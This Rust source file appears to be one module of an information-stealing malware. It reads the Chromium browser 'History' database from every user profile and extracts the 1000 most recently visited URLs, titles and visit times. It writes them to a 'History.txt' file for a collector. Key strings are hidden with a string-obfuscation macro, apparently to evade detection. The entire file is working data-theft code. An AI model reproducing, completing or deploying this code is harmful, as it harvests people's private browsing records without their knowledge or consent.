use crate::alloc::borrow::ToOwned;
use crate::chromium::BrowserData;
use crate::{History, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all, Extract};
use alloc::sync::Arc;
use collector::{Browser, Collector};
use database::TableRecord;
use filesystem::FileSystem;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use obfstr::obfstr as s;
use tasks::{Task, parent_name};

const URLS_URL: usize = 1;
const URLS_TITLE: usize = 2;
const URLS_LAST_VISIT_TIME: usize = 5;

pub(super) struct HistoryTask {
    browser: Arc<BrowserData>,
}

impl HistoryTask {
    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
        Self { browser }
    }
}

impl<C: Collector, F: FileSystem> Task<C, F> for HistoryTask {
    parent_name!("History.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(mut history) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
            &self.browser.profiles,
            &StorageFileSystem,
            |profile| profile / s!("History"),
            s!("Urls"),
            |record| History::extract(record, (URLS_URL, URLS_TITLE, URLS_LAST_VISIT_TIME)),
        ) else {
            return;
        };

        history.sort_by(|a, b| b.last_visit_time.cmp(&a.last_visit_time));
        history.truncate(1000);

        collector.get_browser().increase_history_by(history.len());
        let _ = to_string_and_write_all(&history, "\n\n", filesystem, parent);
    }
}
